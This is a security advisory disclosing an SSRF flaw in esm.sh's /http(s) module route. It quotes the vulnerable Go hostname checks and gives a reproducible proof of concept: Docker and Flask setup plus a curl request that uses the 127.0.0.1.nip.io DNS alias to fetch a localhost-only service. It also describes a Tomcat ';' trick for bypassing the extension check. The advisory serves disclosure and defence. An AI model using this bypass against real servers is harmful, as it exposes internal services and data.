# esm.sh has SSRF localhost/private-network bypass in `/http(s)` module route

**GHSA**: GHSA-p2v6-84h2-5x4r | **CVE**: CVE-2026-27730 | **Severity**: high (CVSS 8.6)

**CWE**: CWE-918

**Affected Packages**:
- **github.com/esm-dev/esm.sh** (go): < 0.0.0-20250616164159-0593516c4cfa

## Description

### Summary
An SSRF vulnerability (CWE-918) exists in esm.sh’s `/http(s)` fetch route.  
The service tries to block localhost/internal targets, but the validation is based on hostname string checks and can be bypassed using DNS alias domains (for example, `127.0.0.1.nip.io` resolving to `127.0.0.1`).  
This allows an external requester to make the esm.sh server fetch internal localhost services.  
Severity:  High (depending on deployment network exposure).

### Details
The vulnerable flow starts at the route handling user-controlled remote URLs:

- `server/router.go:532`
  - Accepts paths beginning with `/http://` or `/https://`.
 ```go
if strings.HasPrefix(pathname, "/http://") || strings.HasPrefix(pathname, "/https://") {
	query := ctx.Query()
	modUrl, err := url.Parse(pathname[1:])
	if err != nil {
		ctx.SetHeader("Cache-Control", ccImmutable)
		return rex.Status(400, "Invalid URL")
	}
	if modUrl.Scheme != "http" && modUrl.Scheme != "https" {
		ctx.SetHeader("Cache-Control", ccImmutable)
		return rex.Status(400, "Invalid URL")
	}
	modUrlStr := modUrl.String()

	// disallow localhost or ip address for production
	if !DEBUG {
		hostname := modUrl.Hostname()
		if isLocalhost(hostname) || !valid.IsDomain(hostname) || modUrl.Host == ctx.R.Host {
			ctx.SetHeader("Cache-Control", ccImmutable)
			return rex.Status(400, "Invalid URL")
		}
	}
```

The internal-target block is string-based:

- `server/router.go:545`
 ```go
			// disallow localhost or ip address for production
			if !DEBUG {
				hostname := modUrl.Hostname()
				if isLocalhost(hostname) || !valid.IsDomain(hostname) || modUrl.Host == ctx.R.Host {
					ctx.SetHeader("Cache-Control", ccImmutable)
					return rex.Status(400, "Invalid URL")
				}
			}
```

Localhost detection itself is limited to hostname patterns:

- `server/utils.go:72`
  - `isLocalhost(...)` checks values like `localhost`, `127.0.0.1`, and `192.168.*`.
  - It does **not** validate the resolved destination IP after DNS resolution.
```go
func isLocalhost(hostname string) bool {
	return hostname == "localhost" || strings.HasSuffix(hostname, ".localhost") || hostname == "127.0.0.1" || (valid.IsIPv4(hostname) && strings.HasPrefix(hostname, "192.168."))
}
```

Fetch proceeds with host-string allowlisting:

- `server/router.go:595-596`
  - `allowedHosts[modUrl.Host] = struct{}{}` then `fetch.NewClient(...allowedHosts)`
```go
allowedHosts := map[string]struct{}{}
allowedHosts[modUrl.Host] = struct{}{}
fetchClient, recycle := fetch.NewClient(ctx.UserAgent(), 15, false, allowedHosts)
defer recycle()
```

- `internal/fetch/fetch.go:49`
  - Host allowlist compares host strings, not resolved IP class.
```go
func (c *FetchClient) Fetch(url *url.URL, header http.Header) (resp *http.Response, err error) {
	if c.allowedHosts != nil {
		if _, ok := c.allowedHosts[url.Host]; !ok {
			return nil, errors.New("host not allowed: " + url.Host)
		}
	}
	if c.userAgent != "" {
		if header == nil {
			header = make(http.Header)
		}
		header.Set("User-Agent", c.userAgent)
	}
	// ...
	return c.Do(req)
}
```

Because validation is based on host strings and not on resolved destination IP ranges, domains that resolve to loopback/private IP can bypass protections.

### PoC
Reproduction tested on local Docker deployment.

1. Run esm.sh:
```bash
docker run -d --name esmsh-5558 -p 5558:80 ghcr.io/esm-dev/esm.sh:latest
```

2. Run an internal localhost-only test service (`secret` response) in the same network namespace:
- Internal network test server code (app.py):
```python
from flask import Flask, Response

@app.get('/secret.js')
def secret_js():
    return Response('secret;\n', mimetype='application/javascript')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5555)
```

Run the internal Python server container (same network namespace as `esmsh-5558`):
```bash
docker run -d --name internal-5555 --network container:esmsh-5558 \
  -v "<YOUR_PATH>/flask-internal:/app" -w /app \
  python:3.11-alpine sh -lc "pip install --no-cache-dir flask && python app.py"
```

Since this server has no Docker port forwarding configured, it is not reachable from outside and is only accessible from the esmsh-5558 container connected on the same network.

4. Since both were running on localhost, I tested it through a Cloudflared tunnel to simulate external access.
```bash
cloudflared tunnel --url http://127.0.0.1:5558
```

5. Trigger SSRF from outside via esm.sh endpoint:
```bash
curl -i "https://ESM.SH_SERVER/http://127.0.0.1.nip.io:5555/secret.js"
```

127.0.0.1 is blocked,
<img width="1206" height="322" alt="image" src="https://github.com/user-attachments/assets/054a7675-5b9e-461a-bb55-9ec7a2b2f43b" />


but 127.0.0.1.nip.io bypasses the filter. 
<img width="1210" height="336" alt="image" src="https://github.com/user-attachments/assets/95b991b1-ff93-495f-b624-458dd48fd5ff" />


This confirms external requesters can fetch internal localhost service content through esm.sh.

### Impact
This is a Server-Side Request Forgery vulnerability (CWE-918).

Impacted:
- Any esm.sh deployment exposing the `/http(s)` route to untrusted users.
- Environments where internal services are reachable from the esm.sh server/container network.

Potential consequences:
- Access to localhost/internal HTTP services not intended for public access.
- Internal service discovery/probing through the server.
- Exposure of sensitive internal endpoints (deployment-dependent, e.g., metadata/internal admin APIs).
- The exploit surface is extension-limited in this route (e.g., ".js", ".ts", ".mjs", ".mts", ".jsx", ".tsx", ".cjs", ".cts", ".vue", ".svelte", ".md", ".css"), so it is not a universal arbitrary-file fetch primitive.
- Even with that limitation, **attackers can still verify whether internal HTTP services exist** and **retrieve internal JavaScript/Markdown resources (and similar allowed extension content) when present.**
- If the internal server is implemented with Apache Tomcat, it may interpret everything after ; as a path parameter in a request such as /asdf/;asdf=a.js. As a result, **it could be possible to bypass extension checks while still receiving the response from the intended path.**
